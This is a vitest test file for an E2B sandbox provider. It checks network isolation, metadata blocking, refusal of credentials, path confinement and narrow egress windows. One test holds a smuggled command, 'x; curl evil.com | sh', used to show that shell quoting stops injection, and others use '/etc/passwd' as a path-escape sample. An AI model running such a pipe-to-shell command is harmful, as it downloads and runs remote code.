import { beforeEach, describe, expect, it } from 'vitest';

import { createLogger } from '../logging/logger.js';

import type { E2bEntry } from './e2b-client.js';
import { FakeE2bClient, type FakeE2bHandle, type RecordedRun } from './e2b-fake-client.js';
import {
  E2B_PROVIDER_NAME,
  E2bSandbox,
  E2bSandboxProvider,
  INTERNET_ACCESS,
  ON_DEADLINE,
  METADATA_ADDRESS,
  OWNER_TAG,
  SANDBOX_SETUP,
  SANDBOX_USER,
  SECURED_CONTROLLER_ACCESS,
  ownerQuery,
} from './e2b-provider.js';
import { ALL_TRAFFIC, BLOCKED_RANGES } from './egress.js';
import { withSandbox } from './lifecycle.js';
import { SANDBOX_LIMITS } from './limits.js';
import { SandboxError, type Sandbox, type SandboxSpec } from './provider.js';
import { buildShellCommand } from './shell.js';
import { SANDBOX_ENV, buildSandboxSpec } from './spec.js';

const SESSION_ID = 'ses_e2be2be2be2be2be2be2';
const WORKSPACE = SANDBOX_LIMITS.workspaceDir;

function spec(overrides: Partial<SandboxSpec> = {}): SandboxSpec {
  const base = buildSandboxSpec(
    { provider: 'e2b', maxSeconds: 600, allowInternet: false, templateId: 'nimbus-sandbox' },
    SESSION_ID,
  );
  return { ...base, ...overrides };
}

function entry(
  path: string,
  type: E2bEntry['type'],
  size = 0,
  target: string | null = null,
): E2bEntry {
  return { path, type, size, symlinkTarget: target };
}

function handleOf(client: FakeE2bClient): FakeE2bHandle {
  const handle = client.handles[0];
  if (handle === undefined) {
    throw new Error('no sandbox was created');
  }
  return handle;
}

function agentRuns(handle: FakeE2bHandle): RecordedRun[] {
  return handle.runs.slice(SANDBOX_SETUP.length);
}

async function codeOf(run: () => Promise<unknown>): Promise<string> {
  try {
    await run();
  } catch (error) {
    return error instanceof SandboxError ? error.code : 'NOT_A_SANDBOX_ERROR';
  }
  return 'NOTHING_THROWN';
}

describe('E2bSandboxProvider.create', () => {
  it('names itself and admits it is real', () => {
    const provider = new E2bSandboxProvider(new FakeE2bClient());

    expect(provider.name).toBe(E2B_PROVIDER_NAME);
    expect(provider.real).toBe(true);
  });

  it('turns on secured controller access, so code inside cannot drive the sandbox', async () => {
    const client = new FakeE2bClient();
    await new E2bSandboxProvider(client).create(spec());

    expect(client.created[0]?.secure).toBe(true);
    expect(SECURED_CONTROLLER_ACCESS).toBe(true);
  });

  it('turns the internet off', async () => {
    const client = new FakeE2bClient();
    await new E2bSandboxProvider(client).create(spec());

    expect(client.created[0]?.allowInternetAccess).toBe(false);
    expect(INTERNET_ACCESS).toBe(false);
  });

  it('denies every outbound address as well as turning the internet off', async () => {
    const client = new FakeE2bClient();
    await new E2bSandboxProvider(client).create(spec());

    expect(client.created[0]?.network).toEqual({ denyOut: [ALL_TRAFFIC] });
    expect(client.created[0]?.network.allowOut).toBeUndefined();
  });

  it('asks for the sandbox to be killed at its deadline, never paused', async () => {
    const client = new FakeE2bClient();
    await new E2bSandboxProvider(client).create(spec());

    expect(client.created[0]?.onTimeout).toBe('kill');
    expect(ON_DEADLINE).toBe('kill');
  });

  it('passes the lifetime through in milliseconds', async () => {
    const client = new FakeE2bClient();
    await new E2bSandboxProvider(client).create(spec({ maxSeconds: 900 }));

    expect(client.created[0]?.timeoutMs).toBe(900_000);
  });

  it('passes the template through', async () => {
    const client = new FakeE2bClient();
    await new E2bSandboxProvider(client).create(spec());

    expect(client.created[0]?.template).toBe('nimbus-sandbox');
  });

  it('sends only the harmless environment feature 016 allows', async () => {
    const client = new FakeE2bClient();
    await new E2bSandboxProvider(client).create(spec());

    expect(client.created[0]?.envs).toEqual(SANDBOX_ENV);
  });

  it('tags the sandbox so the sweeper can find it later', async () => {
    const client = new FakeE2bClient();
    await new E2bSandboxProvider(client).create(spec());

    expect(client.created[0]?.metadata).toEqual({ owner: OWNER_TAG, sessionId: SESSION_ID });
    expect(ownerQuery()).toEqual({ owner: OWNER_TAG });
  });

  it('refuses a spec asking for unrestricted internet', async () => {
    const client = new FakeE2bClient();

    expect(
      await codeOf(() => new E2bSandboxProvider(client).create(spec({ allowInternet: true }))),
    ).toBe('SANDBOX_SPEC_INVALID');
    expect(client.created).toHaveLength(0);
  });

  it('refuses a spec carrying a credential, before anything is rented', async () => {
    const client = new FakeE2bClient();
    const carrying = spec({ env: { GITHUB_TOKEN: 'ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' } });

    expect(await codeOf(() => new E2bSandboxProvider(client).create(carrying))).toBe(
      'SANDBOX_CREDENTIAL_REFUSED',
    );
    expect(client.created).toHaveLength(0);
  });

  it('reports a provider failure as a creation failure', async () => {
    const client = new FakeE2bClient({ createFails: new Error('e2b is down') });

    expect(await codeOf(() => new E2bSandboxProvider(client).create(spec()))).toBe(
      'SANDBOX_CREATE_FAILED',
    );
  });

  it('makes the workspace, because the machine image does not have one', async () => {
    const client = new FakeE2bClient();
    await new E2bSandboxProvider(client).create(spec());
    const setup = handleOf(client).runs.slice(0, SANDBOX_SETUP.length);

    expect(setup[0]?.command).toBe(buildShellCommand(['mkdir', '-p', '--', WORKSPACE]));
    expect(setup[1]?.command).toContain(SANDBOX_USER);
    expect(setup[0]?.options.cwd).toBe('/');
  });

  it('blocks the cloud metadata address from inside the machine', async () => {
    const client = new FakeE2bClient();
    await new E2bSandboxProvider(client).create(spec());
    const setup = handleOf(client).runs.slice(0, SANDBOX_SETUP.length);

    expect(setup[2]?.command).toContain(METADATA_ADDRESS);
    expect(setup[2]?.command).toContain('DROP');
  });

  it('runs every preparation step as root, and nothing else', async () => {
    const client = new FakeE2bClient();
    const sandbox = await new E2bSandboxProvider(client).create(spec());
    await sandbox.execute({ argv: ['npm', 'test'] });

    const runs = handleOf(client).runs;
    expect(runs.slice(0, SANDBOX_SETUP.length).every((run) => run.options.user === 'root')).toBe(
      true,
    );
    expect(runs[SANDBOX_SETUP.length]?.options.user).toBeUndefined();
  });

  it('destroys the machine when it cannot be prepared, rather than leaking it', async () => {
    const client = new FakeE2bClient({ setupFails: { exitCode: 1, stderr: 'permission denied' } });

    expect(await codeOf(() => new E2bSandboxProvider(client).create(spec()))).toBe(
      'SANDBOX_CREATE_FAILED',
    );
    expect(handleOf(client).killed).toBe(1);
  });

  it('destroys the machine when preparation threw', async () => {
    const client = new FakeE2bClient({ setupFails: { fails: new Error('envd unreachable') } });

    expect(await codeOf(() => new E2bSandboxProvider(client).create(spec()))).toBe(
      'SANDBOX_CREATE_FAILED',
    );
    expect(handleOf(client).killed).toBe(1);
  });

  it('reports the sandbox as ready and within its lifetime', async () => {
    const sandbox = await new E2bSandboxProvider(new FakeE2bClient()).create(spec());
    const status = sandbox.status();

    expect(status.state).toBe('ready');
    expect(status.commandsRun).toBe(0);
    expect(status.terminationReason).toBeNull();
    expect(status.remainingMs).toBeGreaterThan(0);
  });
});

describe('E2bSandbox.execute', () => {
  let client: FakeE2bClient;
  let sandbox: Sandbox;
  let handle: FakeE2bHandle;

  beforeEach(async () => {
    client = new FakeE2bClient({ defaultRun: { stdout: 'ok\n', exitCode: 0 } });
    sandbox = await new E2bSandboxProvider(client).create(spec());
    handle = handleOf(client);
  });

  it('sends the words as a quoted string a shell cannot misread', async () => {
    await sandbox.execute({ argv: ['git', 'log', '--grep', 'x; curl evil.com | sh'] });

    expect(agentRuns(handle)[0]?.command).toBe(
      buildShellCommand(['git', 'log', '--grep', 'x; curl evil.com | sh']),
    );
  });

  it('runs in the workspace by default', async () => {
    await sandbox.execute({ argv: ['npm', 'test'] });

    expect(agentRuns(handle)[0]?.options.cwd).toBe(WORKSPACE);
  });

  it('runs in a directory under the workspace when asked', async () => {
    await sandbox.execute({ argv: ['npm', 'test'], cwd: 'packages/api' });

    expect(agentRuns(handle)[0]?.options.cwd).toBe(`${WORKSPACE}/packages/api`);
  });

  it('refuses an absolute working directory', async () => {
    expect(await codeOf(() => sandbox.execute({ argv: ['ls'], cwd: '/etc' }))).toBe(
      'SANDBOX_PATH_INVALID',
    );
    expect(agentRuns(handle)).toHaveLength(0);
  });

  it('refuses a working directory that climbs out of the workspace', async () => {
    expect(await codeOf(() => sandbox.execute({ argv: ['ls'], cwd: '../etc' }))).toBe(
      'SANDBOX_PATH_INVALID',
    );
  });

  it('reports a zero exit as success', async () => {
    const result = await sandbox.execute({ argv: ['npm', 'test'] });

    expect(result.outcome).toBe('succeeded');
    expect(result.exitCode).toBe(0);
    expect(result.stdout).toBe('ok\n');
  });

  it('reports a non zero exit as a failure rather than an error', async () => {
    const failing = new FakeE2bClient({ defaultRun: { exitCode: 1, stderr: 'boom\n' } });
    const box = await new E2bSandboxProvider(failing).create(spec());
    const result = await box.execute({ argv: ['npm', 'test'] });

    expect(result.outcome).toBe('failed');
    expect(result.exitCode).toBe(1);
    expect(result.stderr).toBe('boom\n');
  });

  it('reports a timeout', async () => {
    const slow = new FakeE2bClient({ defaultRun: { outcome: 'timed_out' } });
    const box = await new E2bSandboxProvider(slow).create(spec());
    const result = await box.execute({ argv: ['npm', 'test'] });

    expect(result.outcome).toBe('timed_out');
    expect(result.timedOut).toBe(true);
    expect(result.exitCode).toBeNull();
  });

  it('reports a cancellation the provider noticed', async () => {
    const stopped = new FakeE2bClient({ defaultRun: { outcome: 'cancelled' } });
    const box = await new E2bSandboxProvider(stopped).create(spec());
    const result = await box.execute({ argv: ['npm', 'test'] });

    expect(result.outcome).toBe('cancelled');
    expect(result.timedOut).toBe(false);
  });

  it('does not start a command that was cancelled before it began', async () => {
    const controller = new AbortController();
    controller.abort();

    const result = await sandbox.execute({ argv: ['npm', 'test'], signal: controller.signal });

    expect(result.outcome).toBe('cancelled');
    expect(agentRuns(handle)).toHaveLength(0);
  });

  it('passes the cancellation signal down to the provider', async () => {
    const controller = new AbortController();
    await sandbox.execute({ argv: ['npm', 'test'], signal: controller.signal });

    expect(agentRuns(handle)[0]?.options.signal).toBe(controller.signal);
  });

  it('counts commands that were really started', async () => {
    await sandbox.execute({ argv: ['npm', 'test'] });
    await sandbox.execute({ argv: ['npm', 'run', 'build'] });

    expect(sandbox.status().commandsRun).toBe(2);
  });

  it('bounds the time limit by what the sandbox has left', async () => {
    await sandbox.execute({ argv: ['npm', 'test'], timeoutMs: SANDBOX_LIMITS.maxCommandTimeoutMs });

    const sent = agentRuns(handle)[0]?.options.timeoutMs ?? 0;
    expect(sent).toBeLessThanOrEqual(SANDBOX_LIMITS.maxCommandTimeoutMs);
    expect(sent).toBeLessThanOrEqual(600_000);
  });

  it('refuses a command with no words', async () => {
    expect(await codeOf(() => sandbox.execute({ argv: [] }))).toBe('SANDBOX_COMMAND_INVALID');
  });

  it('refuses a command holding a null byte', async () => {
    expect(
      await codeOf(() => sandbox.execute({ argv: ['echo', `a${String.fromCharCode(0)}b`] })),
    ).toBe('SANDBOX_COMMAND_INVALID');
    expect(agentRuns(handle)).toHaveLength(0);
  });

  it('truncates output past the shared budget and says so', async () => {
    const flood = 'x'.repeat(SANDBOX_LIMITS.outputMaxBytes + 1_000);
    const noisy = new FakeE2bClient({ defaultRun: { stdout: flood } });
    const box = await new E2bSandboxProvider(noisy).create(spec());
    const result = await box.execute({ argv: ['npm', 'test'] });

    expect(result.truncated).toBe(true);
    expect(Buffer.byteLength(result.stdout, 'utf8')).toBeLessThanOrEqual(
      SANDBOX_LIMITS.outputMaxBytes,
    );
  });

  it('spends the output budget across commands, not per command', async () => {
    const half = 'x'.repeat(Math.floor(SANDBOX_LIMITS.outputMaxBytes * 0.7));
    const noisy = new FakeE2bClient({ defaultRun: { stdout: half } });
    const box = await new E2bSandboxProvider(noisy).create(spec());

    const first = await box.execute({ argv: ['npm', 'test'] });
    const second = await box.execute({ argv: ['npm', 'test'] });

    expect(first.truncated).toBe(false);
    expect(second.truncated).toBe(true);
    expect(box.status().outputBytesUsed).toBeLessThanOrEqual(SANDBOX_LIMITS.outputMaxBytes);
  });

  it('refuses to run anything once the sandbox is gone', async () => {
    await sandbox.terminate('completed');

    expect(await codeOf(() => sandbox.execute({ argv: ['npm', 'test'] }))).toBe(
      'SANDBOX_NOT_READY',
    );
  });

  it('refuses to run anything once the lifetime has passed', async () => {
    let clock = Date.now();
    const box = new E2bSandbox(handleOf(client), spec({ maxSeconds: 60 }), () => clock);
    clock += 61_000;

    expect(await codeOf(() => box.execute({ argv: ['npm', 'test'] }))).toBe('SANDBOX_EXPIRED');
  });
});

describe('E2bSandbox.listEntries', () => {
  async function listWith(entries: readonly E2bEntry[]): Promise<Sandbox> {
    const client = new FakeE2bClient({ entries });
    return new E2bSandboxProvider(client).create(spec());
  }

  it('turns provider entries into workspace entries', async () => {
    const sandbox = await listWith([
      entry(`${WORKSPACE}/src`, 'dir'),
      entry(`${WORKSPACE}/src/app.ts`, 'file', 120),
    ]);

    expect(await sandbox.listEntries()).toEqual([
      { path: 'src', kind: 'directory', size: 0, target: null },
      { path: 'src/app.ts', kind: 'file', size: 120, target: null },
    ]);
  });

  it('keeps a symlink and its target, so the tools layer can judge it', async () => {
    const sandbox = await listWith([entry(`${WORKSPACE}/link.ts`, 'symlink', 0, '/etc/passwd')]);

    expect(await sandbox.listEntries()).toEqual([
      { path: 'link.ts', kind: 'symlink', size: 0, target: '/etc/passwd' },
    ]);
  });

  it('calls the folder holding a nested git directory a repository', async () => {
    const sandbox = await listWith([
      entry(`${WORKSPACE}/vendor/lib`, 'dir'),
      entry(`${WORKSPACE}/vendor/lib/.git`, 'dir'),
    ]);

    expect(await sandbox.listEntries()).toEqual([
      { path: 'vendor/lib', kind: 'repository', size: 0, target: null },
    ]);
  });

  it('invents the repository entry when the provider only reported the git directory', async () => {
    const sandbox = await listWith([entry(`${WORKSPACE}/vendor/lib/.git`, 'dir')]);

    expect(await sandbox.listEntries()).toEqual([
      { path: 'vendor/lib', kind: 'repository', size: 0, target: null },
    ]);
  });

  it('never shows anything inside a git directory', async () => {
    const sandbox = await listWith([
      entry(`${WORKSPACE}/.git`, 'dir'),
      entry(`${WORKSPACE}/.git/config`, 'file', 200),
      entry(`${WORKSPACE}/src/app.ts`, 'file', 10),
    ]);

    expect((await sandbox.listEntries()).map((found) => found.path)).toEqual(['src/app.ts']);
  });

  it('does not call the workspace clone itself a nested repository', async () => {
    const sandbox = await listWith([entry(`${WORKSPACE}/.git`, 'dir')]);

    expect(await sandbox.listEntries()).toEqual([]);
  });

  it('drops anything the provider reports from outside the workspace', async () => {
    const sandbox = await listWith([
      entry('/etc/passwd', 'file', 10),
      entry(`${WORKSPACE}/keep.ts`, 'file', 10),
    ]);

    expect((await sandbox.listEntries()).map((found) => found.path)).toEqual(['keep.ts']);
  });

  it('drops the workspace directory itself', async () => {
    const sandbox = await listWith([entry(WORKSPACE, 'dir'), entry(`${WORKSPACE}/a.ts`, 'file')]);

    expect(await sandbox.listEntries()).toHaveLength(1);
  });

  it('drops a path that climbs out of the workspace', async () => {
    const sandbox = await listWith([entry(`${WORKSPACE}/../etc/passwd`, 'file')]);

    expect(await sandbox.listEntries()).toEqual([]);
  });

  it('returns the entries in a settled order', async () => {
    const sandbox = await listWith([
      entry(`${WORKSPACE}/z.ts`, 'file'),
      entry(`${WORKSPACE}/a.ts`, 'file'),
      entry(`${WORKSPACE}/m.ts`, 'file'),
    ]);

    expect((await sandbox.listEntries()).map((found) => found.path)).toEqual([
      'a.ts',
      'm.ts',
      'z.ts',
    ]);
  });

  it('refuses a workspace holding more files than the cap', async () => {
    const many: E2bEntry[] = [];
    for (let index = 0; index <= SANDBOX_LIMITS.maxWorkspaceFiles + 1; index += 1) {
      many.push(entry(`${WORKSPACE}/f${String(index)}.txt`, 'file'));
    }
    const sandbox = await listWith(many);

    expect(await codeOf(() => sandbox.listEntries())).toBe('SANDBOX_WORKSPACE_FULL');
  });
});

describe('E2bSandbox files', () => {
  it('reads a file by its workspace path', async () => {
    const client = new FakeE2bClient({ files: { [`${WORKSPACE}/src/app.ts`]: 'const a = 1;\n' } });
    const sandbox = await new E2bSandboxProvider(client).create(spec());

    expect(await sandbox.readFile('src/app.ts')).toBe('const a = 1;\n');
  });

  it('refuses a path that climbs out of the workspace', async () => {
    const client = new FakeE2bClient();
    const sandbox = await new E2bSandboxProvider(client).create(spec());

    expect(await codeOf(() => sandbox.readFile('../etc/passwd'))).toBe('SANDBOX_PATH_INVALID');
    expect(await codeOf(() => sandbox.readFile('/etc/passwd'))).toBe('SANDBOX_PATH_INVALID');
  });

  it('refuses a file bigger than the cap', async () => {
    const big = 'x'.repeat(SANDBOX_LIMITS.fileMaxBytes + 1);
    const client = new FakeE2bClient({ files: { [`${WORKSPACE}/big.txt`]: big } });
    const sandbox = await new E2bSandboxProvider(client).create(spec());

    expect(await codeOf(() => sandbox.readFile('big.txt'))).toBe('SANDBOX_FILE_TOO_LARGE');
  });

  it('writes a file under the workspace', async () => {
    const client = new FakeE2bClient();
    const sandbox = await new E2bSandboxProvider(client).create(spec());
    await sandbox.writeFile('src/new.ts', 'hello\n');

    expect(handleOf(client).writes).toEqual([
      { path: `${WORKSPACE}/src/new.ts`, contents: 'hello\n' },
    ]);
  });

  it('refuses to write more than the cap', async () => {
    const client = new FakeE2bClient();
    const sandbox = await new E2bSandboxProvider(client).create(spec());

    expect(
      await codeOf(() => sandbox.writeFile('big.txt', 'x'.repeat(SANDBOX_LIMITS.fileMaxBytes + 1))),
    ).toBe('SANDBOX_FILE_TOO_LARGE');
    expect(handleOf(client).writes).toHaveLength(0);
  });
});

describe('E2bSandbox.exportPatch', () => {
  const patch = [
    'diff --git a/src/app.ts b/src/app.ts',
    '--- a/src/app.ts',
    '+++ b/src/app.ts',
    '@@ -1,1 +1,1 @@',
    '-old',
    '+new',
    '',
  ].join('\n');

  function scripted(diff: string, inside = 'true'): FakeE2bClient {
    return new FakeE2bClient({
      runs: {
        [buildShellCommand(['git', '-C', WORKSPACE, 'rev-parse', '--is-inside-work-tree'])]: {
          stdout: `${inside}\n`,
        },
      },
      defaultRun: { stdout: diff },
    });
  }

  it('checks the workspace is a repository, marks new files, then takes the diff', async () => {
    const client = scripted(patch);
    const sandbox = await new E2bSandboxProvider(client).create(spec());
    await sandbox.exportPatch();

    const commands = agentRuns(handleOf(client)).map((run) => run.command);
    expect(commands).toHaveLength(3);
    expect(commands[0]).toContain('rev-parse');
    expect(commands[1]).toContain('intent-to-add');
    expect(commands[2]).toContain('diff');
  });

  it('returns what git said, summarized', async () => {
    const sandbox = await new E2bSandboxProvider(scripted(patch)).create(spec());
    const exported = await sandbox.exportPatch();

    expect(exported.patch).toBe(patch);
    expect(exported.files).toEqual([
      { path: 'src/app.ts', changeKind: 'modified', addedLines: 1, removedLines: 1 },
    ]);
    expect(exported.addedLines).toBe(1);
    expect(exported.removedLines).toBe(1);
  });

  it('refuses when the workspace holds no repository', async () => {
    const sandbox = await new E2bSandboxProvider(scripted(patch, 'false')).create(spec());

    expect(await codeOf(() => sandbox.exportPatch())).toBe('SANDBOX_PATCH_FAILED');
  });

  it('refuses when git itself failed', async () => {
    const client = new FakeE2bClient({ defaultRun: { exitCode: 128, stderr: 'not a repository' } });
    const sandbox = await new E2bSandboxProvider(client).create(spec());

    expect(await codeOf(() => sandbox.exportPatch())).toBe('SANDBOX_PATCH_FAILED');
  });

  it('refuses a binary change', async () => {
    const binary = [
      'diff --git a/logo.png b/logo.png',
      'Binary files a/logo.png and b/logo.png differ',
      '',
    ].join('\n');
    const sandbox = await new E2bSandboxProvider(scripted(binary)).create(spec());

    expect(await codeOf(() => sandbox.exportPatch())).toBe('SANDBOX_BINARY_FILE');
  });
});

describe('E2bSandbox.withEgress', () => {
  it('opens a narrow window and closes it again', async () => {
    const client = new FakeE2bClient();
    const sandbox = (await new E2bSandboxProvider(client).create(spec())) as E2bSandbox;
    await sandbox.withEgress(['github.com'], 60, () => Promise.resolve('done'));

    const networks = handleOf(client).networks;
    expect(networks).toHaveLength(2);
    expect(networks[0]?.allowOut).toEqual(['github.com']);
    expect(networks[0]?.denyOut).toEqual([ALL_TRAFFIC, ...BLOCKED_RANGES]);
    expect(networks[1]).toEqual({ denyOut: [ALL_TRAFFIC] });
  });

  it('closes the window even when the work threw', async () => {
    const client = new FakeE2bClient();
    const sandbox = (await new E2bSandboxProvider(client).create(spec())) as E2bSandbox;

    await expect(
      sandbox.withEgress(['github.com'], 60, () => Promise.reject(new Error('clone failed'))),
    ).rejects.toThrow('clone failed');

    const networks = handleOf(client).networks;
    expect(networks[networks.length - 1]).toEqual({ denyOut: [ALL_TRAFFIC] });
  });

  it('returns what the work returned', async () => {
    const sandbox = (await new E2bSandboxProvider(new FakeE2bClient()).create(
      spec(),
    )) as E2bSandbox;

    expect(await sandbox.withEgress(['github.com'], 60, () => Promise.resolve(42))).toBe(42);
  });

  it('refuses a host nobody wrote down, without touching the network', async () => {
    const client = new FakeE2bClient();
    const sandbox = (await new E2bSandboxProvider(client).create(spec())) as E2bSandbox;

    expect(await codeOf(() => sandbox.withEgress(['evil.com'], 60, () => Promise.resolve(1)))).toBe(
      'SANDBOX_EGRESS_REFUSED',
    );
    expect(handleOf(client).networks).toHaveLength(0);
  });

  it('refuses a window longer than the cap', async () => {
    const sandbox = (await new E2bSandboxProvider(new FakeE2bClient()).create(
      spec(),
    )) as E2bSandbox;

    expect(
      await codeOf(() => sandbox.withEgress(['github.com'], 86_400, () => Promise.resolve(1))),
    ).toBe('SANDBOX_EGRESS_REFUSED');
  });

  it('refuses a second window while one is open', async () => {
    const sandbox = (await new E2bSandboxProvider(new FakeE2bClient()).create(
      spec(),
    )) as E2bSandbox;

    const outcome = await sandbox.withEgress(['github.com'], 60, () =>
      codeOf(() => sandbox.withEgress(['github.com'], 60, () => Promise.resolve(1))),
    );

    expect(outcome).toBe('SANDBOX_EGRESS_REFUSED');
  });

  it('destroys the sandbox if the window cannot be closed again', async () => {
    const client = new FakeE2bClient({ networkFails: new Error('network api down') });
    const sandbox = (await new E2bSandboxProvider(client).create(spec())) as E2bSandbox;

    expect(
      await codeOf(() => sandbox.withEgress(['github.com'], 60, () => Promise.resolve(1))),
    ).toBe('SANDBOX_EGRESS_REFUSED');
    expect(handleOf(client).killed).toBe(1);
  });
});

describe('E2bSandbox.terminate', () => {
  it('kills the machine and records why', async () => {
    const client = new FakeE2bClient();
    const sandbox = await new E2bSandboxProvider(client).create(spec());
    await sandbox.terminate('completed');

    expect(handleOf(client).killed).toBe(1);
    expect(sandbox.status().state).toBe('terminated');
    expect(sandbox.status().terminationReason).toBe('completed');
    expect(sandbox.status().terminatedAt).not.toBeNull();
  });

  it('does nothing the second time, so cleanup can be attempted twice', async () => {
    const client = new FakeE2bClient();
    const sandbox = await new E2bSandboxProvider(client).create(spec());
    await sandbox.terminate('completed');
    await sandbox.terminate('swept');

    expect(handleOf(client).killed).toBe(1);
    expect(sandbox.status().terminationReason).toBe('completed');
  });

  it('reports a failed shutdown rather than pretending the machine is gone', async () => {
    const client = new FakeE2bClient({ killFails: new Error('kill failed') });
    const sandbox = await new E2bSandboxProvider(client).create(spec());

    await expect(sandbox.terminate('completed')).rejects.toThrow('kill failed');
    expect(sandbox.status().state).toBe('failed');
    expect(sandbox.status().terminationReason).toBe('failed');
  });
});

describe('the adapter inside feature 016 lifecycle', () => {
  const logger = createLogger({ level: 'fatal', environment: 'test' });

  it('destroys the machine when the work finishes', async () => {
    const client = new FakeE2bClient({ defaultRun: { stdout: 'ok\n' } });
    const provider = new E2bSandboxProvider(client);

    await withSandbox({ provider, spec: spec(), logger }, async (sandbox) =>
      sandbox.execute({ argv: ['npm', 'test'] }),
    );

    expect(handleOf(client).killed).toBe(1);
  });

  it('destroys the machine when the work threw', async () => {
    const client = new FakeE2bClient();
    const provider = new E2bSandboxProvider(client);

    await expect(
      withSandbox({ provider, spec: spec(), logger }, () =>
        Promise.reject(new Error('agent gave up')),
      ),
    ).rejects.toThrow('agent gave up');

    expect(handleOf(client).killed).toBe(1);
  });

  it('destroys the machine when the work was cancelled', async () => {
    const client = new FakeE2bClient();
    const controller = new AbortController();
    const provider = new E2bSandboxProvider(client);

    await withSandbox({ provider, spec: spec(), logger, signal: controller.signal }, () => {
      controller.abort();
      return Promise.resolve('stopped');
    });

    expect(handleOf(client).killed).toBe(1);
  });
});
